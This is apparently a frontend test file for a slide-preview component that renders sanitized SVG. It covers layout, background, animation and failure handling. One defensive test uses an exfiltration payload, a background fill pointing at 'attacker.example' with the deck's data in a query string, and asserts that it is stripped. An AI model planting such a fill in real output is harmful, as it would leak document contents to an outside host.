// @vitest-environment jsdom
//
// jsdom, NOT the suite-default happy-dom, for the same reason as the sibling
// `SlidePreviewSanitize.test.tsx`: every fragment this component renders goes
// through DOMPurify, and DOMPurify >=3.4.10 mishandles happy-dom's parser
// (dropping benign drawing markup), so a happy-dom run would assert against an
// empty subtree the shipped code never produces in a browser.
/**
 * SlidePreview — the RENDER half.
 *
 * The sibling file pins the sanitizing helpers; this one drives the component:
 * the imperative SVG assembly, the background/defs branches, the recompose
 * reveal, `prefers-reduced-motion`, the failure notice, and the effect's
 * cancel/cleanup paths.
 *
 * `fetchArtifactJson` is the component's only input beyond its props, so the api
 * module is mocked and each test hands the effect one payload. Assertions read
 * the assembled SVG out of the container because the subtree is built with
 * `createElementNS` rather than JSX — it is real DOM, just not React's.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'

import SlidePreview from '../apps/pptx-maker/SlidePreview'
import { fetchArtifactJson } from '../apps/pptx-maker/api'
import type { ComposePayload } from '../apps/pptx-maker/api'
import { COMPOSE_VERSION } from '../apps/pptx-maker/lib'

vi.mock('../apps/pptx-maker/api', () => ({
  fetchArtifactJson: vi.fn(),
}))

const fetchJson = vi.mocked(fetchArtifactJson)

function payload(over: Partial<ComposePayload> = {}): ComposePayload {
  return {
    version: COMPOSE_VERSION,
    viewBox: '0 0 800 600',
    components: [],
    ...over,
  }
}

/** The assembled slide root. Absent until the effect's fetch has resolved. */
function slideRoot(container: HTMLElement): SVGSVGElement | null {
  return container.querySelector<SVGSVGElement>('[role="img"]')
}

/** Direct-child groups, which are the per-component groups when no bgSvg is set. */
function componentGroups(container: HTMLElement): SVGGElement[] {
  const root = slideRoot(container)
  if (!root) return []
  return Array.from(root.children).filter(
    (child): child is SVGGElement => child.tagName.toLowerCase() === 'g',
  )
}

async function waitForSlide(container: HTMLElement): Promise<SVGSVGElement> {
  await waitFor(() => expect(slideRoot(container)).not.toBeNull())
  return slideRoot(container)!
}

beforeEach(() => {
  fetchJson.mockReset()
})

afterEach(() => {
  vi.restoreAllMocks()
})

describe('SlidePreview assembly', () => {
  it('renders the payload as one labelled image with the payload viewBox', async () => {
    fetchJson.mockResolvedValue(payload({ components: [{ svg: '<rect width="10" height="10"/>' }] }))

    const { container } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )

    const root = await waitForSlide(container)
    // The accessible contract: one image named after the slide, so a screen
    // reader announces which slide this is rather than "graphic".
    expect(screen.getByRole('img', { name: 'Slide 1' })).toBe(root)
    expect(root.getAttribute('viewBox')).toBe('0 0 800 600')
    expect(root.getAttribute('preserveAspectRatio')).toBe('xMidYMid')
    expect(root.style.width).toBe('100%')
    expect(root.style.height).toBe('100%')
    // The whole subtree is inert: it is agent-authored markup on the dashboard's
    // own origin, so it must never be an interaction surface.
    expect(root.style.pointerEvents).toBe('none')
    expect(fetchJson).toHaveBeenCalledWith('preview/s1.json')
  })

  it('falls back to a 1920x1080 viewBox and sizes the background rect from it', async () => {
    // An empty viewBox and a missing components array are both shapes the engine
    // can write; neither may blank the preview.
    fetchJson.mockResolvedValue({ version: COMPOSE_VERSION, viewBox: '' } as ComposePayload)

    const { container } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )

    const root = await waitForSlide(container)
    expect(root.getAttribute('viewBox')).toBe('0 0 1920 1080')
    const rect = root.querySelector('rect')
    expect(rect?.getAttribute('width')).toBe('1920')
    expect(rect?.getAttribute('height')).toBe('1080')
    expect(componentGroups(container)).toHaveLength(0)
  })

  it('sizes the background rect from a non-default viewBox', async () => {
    fetchJson.mockResolvedValue(payload({ viewBox: '0 0 640 480' }))

    const { container } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )

    const root = await waitForSlide(container)
    const rect = root.querySelector('rect')
    expect(rect?.getAttribute('width')).toBe('640')
    expect(rect?.getAttribute('height')).toBe('480')
  })

  it('keeps a same-document gradient as the background fill', async () => {
    // The deck's shared gradients live in the separate defs payload and every
    // slide reaches them by id, so a fragment fill must survive.
    fetchJson.mockResolvedValue(payload({ bgFill: 'url(#brandGradient)' }))

    const { container } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )

    const root = await waitForSlide(container)
    expect(root.querySelector('rect')?.getAttribute('fill')).toBe('url(#brandGradient)')
  })

  it('drops an off-origin background fill to transparent', async () => {
    // bgFill is written directly onto the rect, outside the sanitizing walk, so
    // this call site carries its own guard: an off-origin FuncIRI here would be a
    // live GET carrying the deck's text away in a query string.
    fetchJson.mockResolvedValue(payload({ bgFill: 'url(https://attacker.example/?d=deck)' }))

    const { container } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )

    const root = await waitForSlide(container)
    const fill = root.querySelector('rect')?.getAttribute('fill')
    expect(fill).toBe('transparent')
    expect(fill).not.toContain('attacker.example')
  })

  it('uses transparent when the payload names no background fill', async () => {
    fetchJson.mockResolvedValue(payload({ bgFill: '' }))

    const { container } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )

    const root = await waitForSlide(container)
    expect(root.querySelector('rect')?.getAttribute('fill')).toBe('transparent')
  })

  it('renders a background fragment instead of the fallback rect', async () => {
    fetchJson.mockResolvedValue(
      payload({ bgSvg: '<rect width="1920" height="1080" fill="#101418"/>' }),
    )

    const { container } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )

    const root = await waitForSlide(container)
    // The background arrives as a group, and the fallback rect is NOT also drawn
    // over it — the fill proves which of the two branches produced this rect.
    expect(root.firstElementChild?.tagName.toLowerCase()).toBe('g')
    expect(root.querySelectorAll('rect')).toHaveLength(1)
    expect(root.querySelector('rect')?.getAttribute('fill')).toBe('#101418')
  })

  it('appends the deck shared defs so slides can reference them by id', async () => {
    fetchJson.mockResolvedValue(payload())

    const { container } = render(
      <SlidePreview
        composeUrl="preview/s1.json"
        defs={{ defs: '<linearGradient id="deckGrad"><stop offset="0"/></linearGradient>' }}
        label="Slide 1"
      />,
    )

    const root = await waitForSlide(container)
    expect(root.querySelector('#deckGrad')).not.toBeNull()
  })

  it('renders one group per component and leaves a first render unanimated', async () => {
    // A first render fading everything in would make simply OPENING a finished
    // deck look like it was being rebuilt, so `changed` is ignored here.
    fetchJson.mockResolvedValue(
      payload({
        components: [
          { svg: '<rect width="10" height="10"/>', changed: true },
          { svg: '<circle r="5"/>', changed: true },
        ],
      }),
    )

    const { container } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )

    await waitForSlide(container)
    const groups = componentGroups(container)
    expect(groups).toHaveLength(2)
    for (const group of groups) {
      expect(group.style.opacity).toBe('1')
      expect(group.style.transition).toBe('')
    }
  })

  it('renders a component with no markup rather than skipping its group', async () => {
    fetchJson.mockResolvedValue(payload({ components: [{ svg: '' }] }))

    const { container } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )

    await waitForSlide(container)
    const groups = componentGroups(container)
    expect(groups).toHaveLength(1)
    expect(groups[0].childNodes).toHaveLength(0)
  })
})

describe('SlidePreview recompose reveal', () => {
  it('fades in only the components the engine marked changed', async () => {
    fetchJson.mockResolvedValue(payload({ components: [{ svg: '<rect width="1" height="1"/>' }] }))

    const { container, rerender } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )
    await waitForSlide(container)

    fetchJson.mockResolvedValue(
      payload({
        components: [
          { svg: '<rect width="10" height="10"/>', changed: true },
          { svg: '<circle r="5"/>', changed: false },
        ],
      }),
    )
    rerender(<SlidePreview composeUrl="preview/s2.json" defs={null} label="Slide 1" />)

    await waitFor(() => expect(componentGroups(container)).toHaveLength(2))
    const [changed, unchanged] = componentGroups(container)
    // The unchanged component is visible throughout; only the rewritten one
    // starts hidden, which is what makes the reveal say WHICH part moved.
    expect(unchanged.style.opacity).toBe('1')
    expect(unchanged.style.transition).toBe('')
    expect(changed.style.transition).toContain('420ms')
    await waitFor(() => expect(changed.style.opacity).toBe('1'))
  })

  it('staggers several changed components and reveals every one', async () => {
    fetchJson.mockResolvedValue(payload())

    const { container, rerender } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )
    await waitForSlide(container)

    fetchJson.mockResolvedValue(
      payload({
        components: [
          { svg: '<rect width="1" height="1"/>', changed: true },
          { svg: '<rect width="2" height="2"/>', changed: true },
          { svg: '<rect width="3" height="3"/>', changed: true },
        ],
      }),
    )
    rerender(<SlidePreview composeUrl="preview/s2.json" defs={null} label="Slide 1" />)

    await waitFor(() => expect(componentGroups(container)).toHaveLength(3))
    await waitFor(() => {
      for (const group of componentGroups(container)) {
        expect(group.style.opacity).toBe('1')
      }
    })
  })

  it('renders the final state immediately under prefers-reduced-motion', async () => {
    const matchMedia = vi.fn().mockReturnValue({ matches: true })
    vi.stubGlobal('matchMedia', matchMedia)
    fetchJson.mockResolvedValue(payload())

    const { container, rerender } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )
    await waitForSlide(container)

    fetchJson.mockResolvedValue(
      payload({ components: [{ svg: '<rect width="1" height="1"/>', changed: true }] }),
    )
    rerender(<SlidePreview composeUrl="preview/s2.json" defs={null} label="Slide 1" />)

    await waitFor(() => expect(componentGroups(container)).toHaveLength(1))
    const [group] = componentGroups(container)
    expect(group.style.opacity).toBe('1')
    expect(group.style.transition).toBe('')
    expect(matchMedia).toHaveBeenCalledWith('(prefers-reduced-motion: reduce)')
    vi.unstubAllGlobals()
  })

  it('clears the pending reveal timers when the preview unmounts', async () => {
    // Asserted through the timer bookkeeping rather than by waiting out the
    // stagger: a fade that fired after teardown would be a write into an
    // unmounted component's DOM, and a wall-clock wait would only catch that
    // when the machine happened to be slow.
    const STAGGER_MS = 140
    const scheduled = vi.spyOn(window, 'setTimeout')
    fetchJson.mockResolvedValue(payload())

    const { container, rerender, unmount } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )
    await waitForSlide(container)

    fetchJson.mockResolvedValue(
      payload({
        components: [
          { svg: '<rect width="1" height="1"/>', changed: true },
          { svg: '<rect width="2" height="2"/>', changed: true },
        ],
      }),
    )
    rerender(<SlidePreview composeUrl="preview/s2.json" defs={null} label="Slide 1" />)
    await waitFor(() => expect(componentGroups(container)).toHaveLength(2))

    // The second changed component is the one still pending: its reveal is
    // staggered behind the first, which fires immediately.
    const index = scheduled.mock.calls.findIndex((call) => call[1] === STAGGER_MS)
    expect(index, 'the staggered reveal timer was never scheduled').toBeGreaterThanOrEqual(0)
    const timerId = scheduled.mock.results[index].value

    const cleared = vi.spyOn(window, 'clearTimeout')
    unmount()
    expect(cleared).toHaveBeenCalledWith(timerId)
  })
})

describe('SlidePreview failure states', () => {
  it('shows the unavailable notice when the payload schema version moved on', async () => {
    // A newer engine payload must say so rather than draw nonsense.
    fetchJson.mockResolvedValue(payload({ version: COMPOSE_VERSION + 1 }))

    const { container } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )

    expect(await screen.findByText('Preview unavailable')).toBeInTheDocument()
    expect(slideRoot(container)).toBeNull()
  })

  it('shows the notice when the payload cannot be fetched', async () => {
    fetchJson.mockRejectedValue(new Error('HTTP 404'))

    render(<SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />)

    expect(await screen.findByText('Preview unavailable')).toBeInTheDocument()
  })

  it('treats the next poll after a failure as a first render, not a recompose', async () => {
    // The failed path resets the last-rendered URL so a later poll retries. The
    // observable consequence: the retry draws the final state immediately instead
    // of animating, because there is no previous render to diff against.
    fetchJson.mockRejectedValueOnce(new Error('HTTP 404'))

    const { container, rerender } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )
    expect(await screen.findByText('Preview unavailable')).toBeInTheDocument()

    fetchJson.mockResolvedValue(
      payload({ components: [{ svg: '<rect width="1" height="1"/>', changed: true }] }),
    )
    rerender(<SlidePreview composeUrl="preview/s2.json" defs={null} label="Slide 1" />)

    await waitForSlide(container)
    expect(screen.queryByText('Preview unavailable')).toBeNull()
    const [group] = componentGroups(container)
    expect(group.style.opacity).toBe('1')
    expect(group.style.transition).toBe('')
  })

  it('draws nothing when the preview unmounts before the payload arrives', async () => {
    let resolvePayload: (value: ComposePayload) => void = () => {}
    fetchJson.mockReturnValue(
      new Promise<ComposePayload>((resolve) => {
        resolvePayload = resolve
      }),
    )

    const { container, unmount } = render(
      <SlidePreview composeUrl="preview/s1.json" defs={null} label="Slide 1" />,
    )
    unmount()
    resolvePayload(payload({ components: [{ svg: '<rect width="1" height="1"/>' }] }))
    await Promise.resolve()

    expect(slideRoot(container)).toBeNull()
    expect(screen.queryByText('Preview unavailable')).toBeNull()
  })
})
